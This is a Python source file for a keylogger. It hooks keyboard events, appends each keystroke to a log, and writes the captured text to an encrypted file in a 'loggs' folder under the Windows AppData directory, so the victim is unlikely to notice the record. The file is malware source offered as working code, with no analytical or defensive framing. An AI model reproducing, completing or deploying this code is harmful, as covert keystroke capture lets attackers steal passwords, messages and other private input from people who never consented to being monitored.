import keyboardListener
import os
from Crypting import Encryption, Decryption

def eventHandler(event, log:list, filename, encryption:Encryption, decryption:Decryption):
    log.append(event.string)

    filename[0] = decryption.decryptFile(filename[0])
    with open(filename[0], "w+") as f:
        f.write(" ".join(log))
    filename[0] = encryption.encryptFile(filename[0])

def main():
    logFolder = os.getenv("appdata")
    log = []

    encryption = Encryption()
    print(encryption.key)
    decryption = Decryption(key=encryption.key)

    if (logFolder):
        logFolder += "\\loggs"
        logFile = logFolder + "\\log.txt"
    else:
        print("appdata env not found")
        os._exit(0)

    os.makedirs(logFolder)
    open(logFile, "w+").close()
    filename = [encryption.encryptFile(logFile)]

    keylogger = keyboardListener.Listener(eventHandler, args=[log, filename, encryption, decryption])
    keylogger.listen()

if __name__ == "__main__":
    main()
